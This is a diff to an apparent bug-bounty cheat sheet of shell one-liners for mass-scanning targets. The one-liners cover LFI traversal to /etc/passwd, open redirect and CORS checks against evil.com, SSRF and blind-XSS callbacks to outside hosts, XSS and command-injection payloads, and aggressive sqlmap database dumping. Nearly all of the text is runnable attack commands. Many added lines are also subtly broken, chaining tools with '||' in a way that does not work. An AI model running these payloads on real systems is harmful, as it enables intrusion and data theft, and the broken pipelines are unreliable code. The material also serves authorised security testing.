@@ -84,10 +84,10 @@ cat subs.txt | xargs -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' 
 -------------------------------
 ## LFI:
 ```
-cat targets.txt | <gau/katana/hakrawler/waybackurls> |  gf lfi |  httpx -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
+cat targets.txt | gau || hakrawler || waybackurls |  gf lfi |  httpx -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
 ```
 ```
-cat targets.txt | <gau/katana/hakrawler/waybackurls> | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+cat targets.txt | gau || hakrawler || waybackurls | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ```
 ```
 cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n";done
@@ -95,10 +95,10 @@ cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure 
 ----------------------
 ## Open Redirect:
 ```
-waybackurls target.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
+echo target.com | gau | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
 ```
 ```
-cat subs.txt| waybackurls | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
+cat subs.txt | gau | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
 ```
 -----------------------
 ## SSRF:
@@ -115,10 +115,10 @@ cat urls.txt | grep "=" | qsreplace "burpcollaborator_link" >> ssrf.txt; ffuf -c
 file=$1; key="API_KEY"; while read line; do curl https://api.knoxss.pro -d target=$line -H "X-API-KEY: $key" -s | grep PoC; done < $file
 ```
 ```
-cat domains.txt | <gau/katana/hakrawler/waybackurls> | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
+cat domains.txt | gau || hakrawler || waybackurls | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep =  | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
 ```
 ```
-<gau/katana/hakrawler/waybackurls> target.com | grep '=' | qsreplace hack\" -a | while read url;do target-$(curl -s -l $url | egrep -o '(hack" | hack\\")'); echo -e "Target : \e[1;33m $url\e[om" "$target" "\n -"; done I sed 's/hack"/[xss Possible] Reflection Found/g'
+echo target.com | gau || hakrawler || waybackurls | grep '=' | qsreplace hack\" -a | while read url;do target-$(curl -s -l $url | egrep -o '(hack" | hack\\")'); echo -e "Target : \e[1;33m $url\e[om" "$target" "\n -"; done I sed 's/hack"/[xss Possible] Reflection Found/g'
 ```
 ```
 cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert(" 
@@ -127,7 +127,7 @@ cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{thi
 cat targets.txt | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
 ```
 ```
-<gau/katana/hakrawler/waybackurls> target.com | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
+echo target.com | gau || hakrawler || waybackurls | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
 ```
 ```
 cat urls.txt | grep "=" | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
@@ -152,7 +152,7 @@ cat output.json | jq | grep -o '"url": ".*"' | grep -o 'https://[^"]*'
 ```
 **Search for Sensitive files from Wayback**
 ```
-<gau/katana/hakrawler/waybackurls> domain.com | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar"
+echo target.com | gau || hakrawler || waybackurls | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar"
 ```
 ```
 cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200
@@ -160,7 +160,7 @@ cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/
 -------------------
 ## SQLi:
 ```
-cat subs.txt | httpx -silent | anew | waybackurls | gf sqli >> sqli.txt ; sqlmap -m sqli.txt -batch --random-agent --level 5 --risk 3 --dbs
+cat subs.txt | httpx -silent | anew | waybackurls | gf sqli >> sqli.txt ; sqlmap -m sqli.txt --batch --random-agent --level 5 --risk 3 --dbs 
 ```
 ***scan multiple hosts parallely***
 ```
@@ -178,7 +178,7 @@ find -type f -name "log" -exec sh -c 'grep -q "Parameter" "{}" && echo "{}: SQLi
 ----------------
 ## CORS:
 ```
-<gau/katana/hakrawler/waybackurls> http://target.com | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
+echo target.com | gau || hakrawler || waybackurls | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
 ```
 ---------------
 ## Prototype Pollution:
@@ -230,14 +230,14 @@ subfinder -d target.com | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x”
 ## JS Files:
 ### Find JS Files:
 ```
-<gau/katana/hakrawler/waybackurls> target.com | grep -iE '.js'|grep -iEv '(.jsp|.json)' | anew js.txt
+echo target.com | gau || hakrawler || waybackurls | grep -iE '.js'|grep -iEv '(.jsp|.json)' | anew js.txt
 ```
 ```
-<subfinder/assetfinder/amass/chaos> target.com | <gau/katana/hakrawler/waybackurls> | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
+subfinder -d target.com | gau || hakrawler || waybackurls | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
 ```
 ### Hidden Params in JS:
 ```
-cat subs.txt | <gau/katana/hakrawler/waybackurls> | sort -u | httpx -silent -threads 100 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
+cat subs.txt | gau || hakrawler || waybackurls | sort -u | httpx -silent -threads 100 | grep -Eiv '(.eot|.jpg|.jpeg|.gif|.css|.tif|.tiff|.png|.ttf|.otf|.woff|.woff2|.ico|.svg|.txt|.pdf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -Eiv '\.js$|([^.]+)\.js|([^.]+)\.js\.[0-9]+$|([^.]+)\.js[0-9]+$|([^.]+)\.js[a-z][A-Z][0-9]+$' | sed 's/.*/&=FUZZ/g'); echo -e "\e[1;33m$url\e[1;32m$vars";done
 ```
 ### Extract sensitive end-point in JS:
 ```
@@ -268,7 +268,7 @@ nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v
 ```
 ## IPs from CIDR
 ```
-echo cidr | httpx -t 100 | nuclei -t ~/nuclei-templates/ssl/ssl-dns-names.yaml | cut -d " " -f7 | cut -d "]" -f1 |  sed 's/[//' | sed 's/,/\n/g' | sort -u 
+echo cidr | httpx -t 100 | nuclei -id ssl-dns-names | cut -d " " -f7 | cut -d "]" -f1 |  sed 's/[//' | sed 's/,/\n/g' | sort -u 
 ```
 ## SQLmap Tamper Scripts - WAF bypass
 ```
